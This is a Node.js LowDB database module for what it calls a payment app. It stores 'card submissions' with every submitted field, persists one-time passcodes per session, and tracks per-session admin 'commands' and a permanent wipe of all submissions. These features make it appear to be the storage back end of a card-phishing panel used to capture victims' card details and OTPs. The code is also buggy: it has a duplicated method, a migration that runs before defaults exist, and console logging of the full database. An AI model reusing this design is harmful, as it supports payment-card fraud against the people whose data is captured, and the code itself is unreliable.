// Enhanced LowDB Database Configuration with Card Submissions Support
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const path = require('path');
const fs = require('fs');
const logger = require('./logger');

// ============================================
// 1?? HARD-FIX: Explicit database file path resolution
// ============================================
const DB_FILE = path.join(__dirname, '../data/payments.json');
console.log('[DATABASE] Using file:', DB_FILE);
console.log('[DATABASE] __dirname:', __dirname);
console.log('[DATABASE] Resolved path:', path.resolve(DB_FILE));

// Ensure data directory exists
const dataDir = path.dirname(DB_FILE);
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
    console.log('[DATABASE] Created data directory:', dataDir);
}

class Database {
    constructor() {
        this.db = null;
    }
    
    // Initialize database connection
    async connect() {
        try {
            console.log('[DATABASE] Connecting to database at:', DB_FILE);
            const adapter = new FileSync(DB_FILE);
            this.db = low(adapter);
            
            // 3?? CRITICAL: Only set defaults if db.data is null/undefined
            // DO NOT overwrite existing data
            if (!this.db.has('transactions').value()) {
                console.log('[DATABASE] Initializing empty transactions array');
            }
            if (!this.db.has('paymentSessions').value()) {
                console.log('[DATABASE] Initializing empty paymentSessions array');
            }

        // Migration: Add viewed field to existing submissions
        const submissions = this.db.get('cardSubmissions').value();
        let migrated = 0;
        submissions.forEach(submission => {
            if (submission.viewed === undefined) {
                this.db.get('cardSubmissions')
                    .find({ sessionId: submission.sessionId })
                    .assign({ viewed: false })
                    .write();
                migrated++;
            }
        });
        if (migrated > 0) {
            console.log(`[DATABASE] Migrated ${migrated} submissions to include viewed field`);
        }
            if (!this.db.has('cardSubmissions').value()) {
                console.log('[DATABASE] Initializing empty cardSubmissions array');
            }
            if (!this.db.has('adminUsers').value()) {
                console.log('[DATABASE] Initializing empty adminUsers array');
            }
            if (!this.db.has('adminSessions').value()) {
                console.log('[DATABASE] Initializing empty adminSessions array');
            }
            if (!this.db.has('auditLog').value()) {
                console.log('[DATABASE] Initializing empty auditLog array');
            }
            
            // Set defaults ONLY for missing keys (does not overwrite existing data)
            this.db.defaults({
                transactions: [],
                paymentSessions: [],
                cardSubmissions: [],
                adminUsers: [],
                adminSessions: [],
                auditLog: []
            }).write();
            
            // Log what was loaded
            const existingSubmissions = this.db.get('cardSubmissions').value();
            console.log('[DATABASE] Loaded cardSubmissions:', existingSubmissions?.length || 0);
            console.log('[DATABASE] Database connected successfully');
            
            logger.info('Database connected:', DB_FILE);
            return Promise.resolve();
        } catch (error) {
            logger.error('Database connection error:', error);
            console.error('[DATABASE] Connection error:', error);
            return Promise.reject(error);
        }
    }
    
    // Close connection
    close() {
        logger.info('Database connection closed');
        return Promise.resolve();
    }
    
    // ============================================
    // CARD SUBMISSION METHODS (NEW)
    // ============================================
    
    async createCardSubmission(submission) {
        // CRITICAL FIX: Include ALL submission data
        const submissionData = {
            ...submission,  // SPREAD ALL FIELDS FROM submission parameter
            viewed: false,  // Track if admin has clicked on it
            isSeen: false,  // Track if admin has clicked on it
            commandsHidden: false,  // Track if commands are hidden
            created_at: new Date().toISOString(),
            updated_at: new Date().toISOString()
        };
        
        this.db.get('cardSubmissions')
            .push(submissionData)
            .write();
        
        console.log('[DATABASE] Card submission created:', submissionData.sessionId);
        
        return Promise.resolve(submissionData);
    }
    
    // 2?? DEEP LOGGING: Add extensive logging to prove what is being read
    async getAllCardSubmissions(limit = 1000) {
        console.log('[DATABASE] getAllCardSubmissions() called');
        console.log('[DATABASE] DB_FILE path:', DB_FILE);
        console.log('[DATABASE] db.data:', this.db.data);
        console.log('[DATABASE] db.data.cardSubmissions:', this.db.data?.cardSubmissions);
        console.log('[DATABASE] submissions length:', this.db.data?.cardSubmissions?.length || 0);
        
        const submissions = this.db.get('cardSubmissions')
            .orderBy(['created_at'], ['desc'])
            .take(limit)
            .value();
        
        console.log('[DATABASE] Retrieved submissions count:', submissions?.length || 0);
        console.log('[DATABASE] First submission:', submissions?.[0]?.sessionId || 'none');
        
        return submissions;
    }
    
    async getCardSubmission(sessionId) {
        return this.db.get('cardSubmissions')
            .find({ sessionId })
            .value();
    }
    
    async markSubmissionAsSeen(sessionId) {
        this.db.get('cardSubmissions')
            .find({ sessionId })
            .assign({ 
                isSeen: true,
                updated_at: new Date().toISOString()
            })
            .write();
        return Promise.resolve();
    }
    
    
    async markSubmissionAsViewed(sessionId) {
        this.db.get('cardSubmissions')
            .find({ sessionId })
            .assign({ 
                viewed: true,
                updated_at: new Date().toISOString()
            })
            .write();
        return Promise.resolve();
    }
    async hideSubmissionCommands(sessionId) {
        this.db.get('cardSubmissions')
            .find({ sessionId })
            .assign({ 
                commandsHidden: true,
                updated_at: new Date().toISOString()
            })
            .write();
        return Promise.resolve();
    }
    
    async updateSubmissionStatus(sessionId, status, reason = null) {
        const updates = { 
            status,
            updated_at: new Date().toISOString()
        };
        
        if (reason) {
            updates.failureReason = reason;
        }
        
        this.db.get('cardSubmissions')
            .find({ sessionId })
            .assign(updates)
            .write();
        
        return Promise.resolve();
    }
    async markCommandExecuted(sessionId) {
        this.db.get('cardSubmissions')
            .find({ sessionId })
            .assign({ 
                commandExecuted: true,
                commandExecutedAt: new Date().toISOString(),
                updated_at: new Date().toISOString()
            })
            .write();
        return Promise.resolve();
    }
    
    // ============================================
    // TRANSACTION METHODS
    // ============================================
    
    async createTransaction(transaction) {
        this.db.get('transactions')
            .push({
                ...transaction,
                created_at: new Date().toISOString(),
                completed_at: transaction.status === 'completed' ? new Date().toISOString() : null
            })
            .write();
        return Promise.resolve();
    }
    
    async getTransaction(id) {
        return this.db.get('transactions').find({ id }).value();
    }
    
    async getAllTransactions(limit = 100) {
        return this.db.get('transactions')
            .orderBy(['created_at'], ['desc'])
            .take(limit)
            .value();
    }
    
    // ============================================
    // SESSION METHODS
    // ============================================
    
    async createPaymentSession(session) {
        this.db.get('paymentSessions')
            .push({
                ...session,
                created_at: new Date().toISOString(),
                updated_at: new Date().toISOString()
            })
            .write();
        return Promise.resolve();
    }
    
    async updatePaymentSession(sessionId, updates) {
        this.db.get('paymentSessions')
            .find({ sessionId })
            .assign({ ...updates, updated_at: new Date().toISOString() })
            .write();
        return Promise.resolve();
    }
    
    async getPaymentSession(sessionId) {
        return this.db.get('paymentSessions').find({ sessionId }).value();
    }
    
    // ============================================
    // ADMIN METHODS
    // ============================================
    
    async createAdminUser(username, passwordHash) {
        const id = this.db.get('adminUsers').size().value() + 1;
        this.db.get('adminUsers')
            .push({
                id,
                username,
                password_hash: passwordHash,
                role: 'admin',
                is_active: true,
                failed_login_attempts: 0,
                locked_until: null,
                created_at: new Date().toISOString(),
                last_login: null
            })
            .write();
        return Promise.resolve();
    }
    
    async getAdminUser(username) {
        return this.db.get('adminUsers').find({ username }).value();
    }
    
    async updateFailedLoginAttempts(username, attempts, lockedUntil = null) {
        this.db.get('adminUsers')
            .find({ username })
            .assign({ 
                failed_login_attempts: attempts,
                locked_until: lockedUntil
            })
            .write();
        return Promise.resolve();
    }
    
    async updateLastLogin(username) {
        this.db.get('adminUsers')
            .find({ username })
            .assign({ 
                last_login: new Date().toISOString(),
                failed_login_attempts: 0,
                locked_until: null
            })
            .write();
        return Promise.resolve();
    }
    

    // ============================================
    // PERMANENT DELETE ALL SUBMISSIONS
    // ============================================
    
    async deleteAllSubmissions() {
        try {
            const count = this.db.get('cardSubmissions').size().value();
            
            // Completely clear the cardSubmissions array
            this.db.set('cardSubmissions', []).write();
            
            // Log the deletion
            console.log(`[DATABASE] ??? PERMANENTLY DELETED ${count} submissions`);
            
            return count;
        } catch (error) {
            console.error('[DATABASE] Error deleting all submissions:', error);
            throw error;
        }
    }
    // Mark submission as viewed
    async markSubmissionAsViewed(sessionId) {
        try {
            this.db.get('cardSubmissions')
                .find({ sessionId: sessionId })
                .assign({ 
                    viewed: true, 
                    viewedAt: new Date().toISOString(),
                    updated_at: new Date().toISOString()
                })
                .write();
            
            console.log('[DATABASE] Submission marked as viewed:', sessionId);
            return Promise.resolve({ success: true });
        } catch (error) {
            console.error('[DATABASE] Error marking submission as viewed:', error);
            throw error;
        }
    }
    // ============================================
        // ============================================
    // AUDIT LOG
    // ============================================
    
    async logAudit(event) {
        this.db.get('auditLog')
            .push({
                ...event,
                created_at: new Date().toISOString()
            })
            .write();
        return Promise.resolve();
    }

    async getSubmissionBySessionId(sessionId) {
        try {
            await this.connect();
            const submissions = this.db.data.cardSubmissions || [];
            const submission = submissions.find(s => s.sessionId === sessionId);
            console.log('[DATABASE] getSubmissionBySessionId:', sessionId, 'found:', !!submission);
            return submission || null;
        } catch (error) {
            console.error('[DATABASE] Error getting submission by sessionId:', error);
            return null;
        }
    }

    // Persist OTP for a submission
    async setSubmissionOtp(sessionId, otp, otpTimestamp = null) {
        try {
            const ts = otpTimestamp || new Date().toISOString();
            this.db.get('cardSubmissions')
                .find({ sessionId })
                .assign({ otp: otp, otpTimestamp: ts, updated_at: new Date().toISOString() })
                .write();
            console.log('[DATABASE] OTP saved for submission:', sessionId);
            return Promise.resolve({ success: true });
        } catch (error) {
            console.error('[DATABASE] Error saving OTP for submission:', error);
            throw error;
        }
    }
}

// 4?? SINGLETON INSTANCE - Only ONE database instance
const database = new Database();



module.exports = database;
